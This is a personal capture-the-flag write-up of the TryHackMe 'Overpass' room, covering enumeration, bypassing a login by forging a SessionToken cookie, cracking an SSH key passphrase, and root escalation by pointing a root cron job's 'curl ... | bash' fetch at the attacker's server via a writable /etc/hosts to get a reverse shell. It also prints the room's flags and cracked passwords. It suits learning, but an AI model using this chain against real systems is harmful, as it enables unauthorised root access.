---
title: "Overpass"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

<img src="overpass.png" width=200 height=200 alt="overpass">

## Enumeration

### nmap

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC+9C+kkHPiled/u3cVUVHHe7NS68fdN1+LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX+GrLkXokkcBXlxj0NV+r5t+Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX+Amn3
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L+O4GvqKqkwShe5DFEWeIMuzxjhE0AW+LH4uJUVdoC0985Gy3z9zQU=
|   256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH+1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### ffuf

```
aboutus                 [Status: 301, Size: 0, Words: 1, Lines: 1]
admin                   [Status: 301, Size: 42, Words: 3, Lines: 3]
css                     [Status: 301, Size: 0, Words: 1, Lines: 1]
downloads               [Status: 301, Size: 0, Words: 1, Lines: 1]
img                     [Status: 301, Size: 0, Words: 1, Lines: 1]
index.html              [Status: 301, Size: 0, Words: 1, Lines: 1]
```

well first enumeration got us the minimum

Meaning we have to focus on the websie itself

let's focus on their about us page first

```
Ninja - Lead Developer

Pars - Shibe Enthusiast and Emotional Support Animal Manager

Szymex - Head Of Security

Bee - Chief Drinking Water Coordinator

MuirlandOracle - Cryptography Consultant
```

potential usernames? not sure...

Shall we bruteforce the admin page we found? is it anything in their source code?

Lets focus on admin page then..it's an easy room it can't be something too complicated

Oh the javascript login function

```
async function login() {
const usernameBox = document.querySelector("#username");
const passwordBox = document.querySelector("#password");
const loginStatus = document.querySelector("#loginStatus");
loginStatus.textContent = ""
const creds = { username: usernameBox.value, password: passwordBox.value }
const response = await postData("/api/login", creds)
const statusOrCookie = await response.text()
if (statusOrCookie === "Incorrect credentials") {
loginStatus.textContent = "Incorrect Credentials"
passwordBox.value=""
} else {
Cookies.set("SessionToken",statusOrCookie)
window.location = "/admin"
}
}
```

On successful login a SessionToken cookie is created

lets craft it ourselves..as long as the cookie is named SessionToken we pass

```
Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox
```

haha poor james...ok lets crack his key with john and rockyou

```
james13 (james_id_rsa)

james:james13
```

If james forgets that passphrase too he is a moron

```
$chmod 600 james_id_rsa

$ssh James@10.10.72.200 -i james_id_rsa
Enter passphrase for key 'james_id_rsa':
Connection closed by 10.10.72.200 port 22
```

ugh...what is this again???? yeah it was serverfault error

I just had to wait (or restart the macine) and now it works

```
james@overpass-prod:~$ cat user.txt
thm{james_got_a_new_job}
```

got user FLAG

another file there

```
james@overpass-prod:~$ cat todo.txt
To Do:

> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
> Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
> They're not updating on the website
```

lets privEsc before we got problems again

## Prviledge Escalation

`sudo -l` won't work this time beacause we dont have james sudo password

He say he used overpass to store it

it seems like we need to use the overpass build script

I already downloaded it in soure files earlier

```
james@overpass-prod:~$ find / -name 'overpass' 2> /dev/null
/usr/bin/overpass
```

ok they got overpass installed

```
overpass
Welcome to Overpass
Options:
1 Retrieve Password For Service
2 Set or Update Password For Service
3 Delete Password For Service
4 Retrieve All Passwords
5 Exit
Choose an option: 4
System saydrawnlyingpicture
```

we retrieve system password

```
sudo -l
[sudo] password for james:
Sorry, user james may not run sudo on overpass-prod.
```

lmao that was a big waste of my time

well lets uplaod linPEAS with a python server and get real informations

```
╔══════════╣ Cron jobs
...

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

- - - - - root curl overpass.thm/downloads/src/buildscript.sh | bash

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/etc/hosts
/home/james
/run/lock
/run/screen
/run/screen/S-james
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory
```

Basically a cron runs every 1 minutes as root and do a curl to `overpass.thm`

if its not in dns its a vhost and the `/etc/hosts` is writable

Amazing...we use nano to point overpass.thm to our ip address

```
cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.8.226.203 overpass.thm

# The following lines are desirable for IPv6 capable hosts

::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

That means every 1 min the cron gonna run at /myserverfolder/downloads/src/buildscript.sh

We just have to make that directory structure in a www folder and make MY buildscript.sh spawn a reverse shell

we catch that connection in another netcat listenner

1 minute after we are root

```
root@overpass-prod:~# cat root.txt
cat root.txt
thm{control_over_the_host_server}
```

For an easy room that privilege escalation was...tedious...but so great

It was so cool making the run from or own server
